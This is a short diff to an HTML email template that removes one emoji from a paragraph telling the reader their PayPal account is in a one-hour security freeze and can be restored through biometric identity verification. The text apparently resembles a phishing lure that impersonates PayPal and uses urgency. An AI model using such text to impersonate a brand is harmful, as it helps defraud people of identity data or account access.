@@ -96,7 +96,7 @@ Your account has been placed into Security Lockdown for 1 hour to protect your f
             </div>
 
             <p style="font-size: 13px; color: #475569; line-height: 1.6;">
-              🔒 <strong>Action Taken:</strong> Your PayPal account has been placed in a temporary 1-Hour Security Freeze to ensure complete protection. You can verify your identity through biometric KYC to restore immediate access.
+              <strong>Action Taken:</strong> Your PayPal account has been placed in a temporary 1-Hour Security Freeze to ensure complete protection. You can verify your identity through biometric KYC to restore immediate access.
             </p>
 
             <div style="text-align: center; margin: 24px 0 12px 0;">
